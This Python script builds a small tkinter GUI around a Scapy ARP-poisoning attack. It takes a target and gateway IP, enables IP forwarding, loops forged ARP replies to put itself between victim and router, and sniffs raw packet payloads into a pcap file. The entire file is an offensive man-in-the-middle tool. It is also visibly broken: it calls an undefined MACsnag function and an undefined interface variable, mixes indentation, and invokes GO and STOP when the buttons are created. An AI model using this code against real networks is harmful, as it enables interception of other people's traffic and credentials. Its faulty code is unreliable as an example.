# -*- coding: utf-8 -*-

#############################
# Title - Arp Poisonning
# Date - 06/09/2017
# Author - Rémi LIQUETE
#############################


############ FUNCTION ################
# Get mac address function
def get_mac(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

# ARP poisonning function
def arp_poison(routerIP, victimIP):
    victimMAC = get_mac(victimIP)
    routerMAC = get_mac(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

# Back to default function
def back_default(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

# Sniffing function
def sniffer():
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)

# Attack function
def BOUM(routerIP, victimIP):
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	while 1:
        arp_poison(routerIP, victimIP)
        time.sleep(1)
        sniffer()       

# Go button function
def GO(routerIP, victimIP):
	BOUM(routerIP, victimIP)

# Stop button function
def STOP(routerIP, victimIP):
	back_default(routerIP, victimIP)
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)

############ BODY ####################

import tkinter
import threading
from scapy.all import *

# Fenêtre principale
mainWindow = tkinter.Tk()

mainFrame = tkinter.Frame(mainWindow, width=800, height=800, borderwidth=1)
mainFrame.pack(fill='both')

# Target Side
targetFrame = tkinter.Frame(mainFrame, width=300, height=300, borderwidth=1)
targetFrame.pack(side="left", fill='y')

labelTarget = tkinter.Label(targetFrame, text="Target IP")
labelTarget.pack(side="left", fill='y')

varTarget = tkinter.StringVar()
targetEntry = tkinter.Entry(targetFrame, textvariable=varTarget, width=30)
targetEntry.pack(side="right", fill='y')

# Gateway side
gatewayFrame = tkinter.Frame(mainFrame, width=300, height=300, borderwidth=1)
gatewayFrame.pack(side="right", fill='y')

labelGateway = tkinter.Label(gatewayFrame, text="Gateway IP")
labelGateway.pack(side="left", fill='y')

varGateway = tkinter.StringVar()
gatewayEntry = tkinter.Entry(gatewayFrame, textvariable=varGateway, width=30)
gatewayEntry.pack(side="right", fill='y')

# Buttons
butonGO = tkinter.Button(mainFrame, text="GO !", command=GO(varGateway, varTarget))
butonGO.pack(side="bottom", fill="none")

buttonStop = tkinter.Button(mainFrame, text="Stop", command=STOP(varGateway, varTarget))
buttonStop.pack(side="bottom", fill="none")

# Scapy part
gateway_mac = get_mac(varGateway)
target_mac = get_mac(varTarget)

# Attack loop to put in the "GO" button



mainWindow.mainloop()

